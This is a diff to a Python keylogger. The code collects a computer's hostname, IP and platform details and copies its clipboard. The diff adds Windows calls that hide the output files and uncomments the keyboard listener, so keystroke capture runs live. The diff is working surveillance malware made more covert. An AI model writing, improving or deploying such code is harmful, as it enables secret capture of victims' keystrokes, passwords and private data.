@@ -70,7 +70,6 @@ extend = "\\"
 
 # Callback function to handle tang press events
 
-
 def computer_information():
     with open(fil + extend + sys_info, "a") as f:
         hostname = socket.gethostname()
@@ -87,6 +86,9 @@ def computer_information():
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
+        ret = ctypes.windll.kernel32.SetFileAttributesW(sys_info, FILE_ATTRIBUTE_HIDDEN)
+        if not ret:
+            raise ctypes.WinError()
 
 def copy_clipboard():
     with open(fil + extend + clip_inf, "a") as f:
@@ -99,6 +101,9 @@ def copy_clipboard():
 
         except:
             f.write("Clipboard could be not be copied")
+        ret = ctypes.windll.kernel32.SetFileAttributesW(clip_inf, FILE_ATTRIBUTE_HIDDEN)
+        if not ret:
+            raise ctypes.WinError()
 
 # get screenshots
 def screenshot():
@@ -108,7 +113,6 @@ def screenshot():
 #screenshot()
 
 copy_clipboard()
-
 computer_information()
 def on_press(tang):
     global tangs, count
@@ -157,5 +161,5 @@ def write_file(tangs):
 # start
 ########################################
 
-#with Listener(on_press=on_press, on_release=on_release) as listener:
-   # listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener:
+   listener.join()
